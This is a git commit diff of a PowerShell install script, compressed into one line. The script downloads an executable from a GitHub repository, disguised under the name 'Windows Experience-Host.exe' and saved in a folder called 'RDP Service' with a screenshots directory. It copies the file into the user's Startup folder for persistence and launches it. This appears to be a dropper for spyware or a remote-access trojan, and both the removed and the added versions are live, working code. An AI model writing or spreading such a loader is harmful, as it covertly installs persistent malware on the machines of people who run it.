7639c2bf3064e3617af7bdd6203e7e598cb82b35
Kyreesemm <143425449+Kyreesemm@users.noreply.github.com>
2025-05-07 02:10:15 +0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,6 +1,1 @@
-$url = "https://github.com/Kyreesemm/garbageJ8k0hH9s/raw/main/Windows%20Experience-Host.exe"
-$dir = "$env:USERPROFILE\RDP Service"
-md $dir\screenshots -Force
-(New-Object Net.WebClient).DownloadFile($url, "$dir\WinExpHost.exe")
-copy "$dir\WinExpHost.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-Start-Process "$dir\WinExpHost.exe"
+$url="https://github.com/Kyreesemm/garbageJ8k0hH9s/raw/main/Windows%20Experience-Host.exe"; $dir="$env:USERPROFILE\RDP Service"; md "$dir\screenshots" -Force; wget $url -OutFile "$dir\WinExpHost.exe"; cp "$dir\WinExpHost.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"; Start-Process "$dir\WinExpHost.exe"; exit
